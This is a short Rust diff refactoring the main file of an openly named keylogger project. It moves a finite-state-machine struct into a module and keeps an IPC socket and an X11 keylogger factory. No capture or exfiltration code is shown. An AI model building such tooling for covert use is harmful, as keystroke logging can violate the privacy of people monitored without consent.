@@ -4,16 +4,11 @@ use std::os::unix::net::UnixStream;
 use clap::Parser;
 
 use keylogger::keylog::keylog_factory::{KeyloggerFactory, KeyloggerTypes, KeyloggerFact};
-use keylogger::keylogger_fsm::{State, IdleState};
+use keylogger::keylogger_fsm::{State, KeyLoggerFSM};
 use keylogger::server_input::ServerCli;
 use keylogger::client_input::Commands;
 use keylogger::logger::init_logger;
 
-//include!("../keylog/keylog_factory.rs");
-
-struct KeyLoggerFSM {
-    state: Box<dyn State>,
-}
 
 
 fn main() -> std::io::Result<()> {
@@ -30,9 +25,7 @@ fn main() -> std::io::Result<()> {
     let listener = create_socket("/tmp/keylog.socket")?;
     log::info!("Created IPC socket");
 
-    let mut keylogger = KeyLoggerFSM {
-        state: Box::new(IdleState),
-    };
+    let mut keylogger = KeyLoggerFSM::new();
 
     let mut x_keylogger = match KeyloggerFactory.create_keylogger(KeyloggerTypes::X) {
         Ok(xkeylogger) => xkeylogger,
